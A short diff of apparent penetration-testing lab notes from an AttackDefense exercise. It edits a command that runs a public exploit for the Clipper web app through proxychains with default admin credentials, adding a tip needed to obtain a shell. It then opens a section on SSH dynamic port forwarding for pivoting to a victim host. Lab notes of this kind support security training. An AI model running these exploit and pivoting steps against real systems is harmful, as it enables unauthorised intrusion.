@@ -86,10 +86,9 @@ ProxyChains-3.1 (http://proxychains.sf.net)
 content="0;url=/clipper/manager">
 
 root@attackdefense:~# searchsploit clipper (code execution > 38730.py)
-root@attackdefense:~# proxychains python 38730.py http://192.181.168.3/clipper admin password
+root@attackdefense:~# proxychains python 38730.py http://192.181.168.3/clipper/ admin password   (the word clipper must be > /clipper/ > if it isn't you cannot get a shell)
 
-
-_________________________________________________________________________________________________________________________________________________________________________
+_______________________________________________________________________________________________________________________________________________________________________________
 SSH tunneling with dynamic port forwarding ( Use proxychains with ssh to do port forwarding )
 -------------------------------------------
 ssh port is open in victim 1(192.163.141.3)
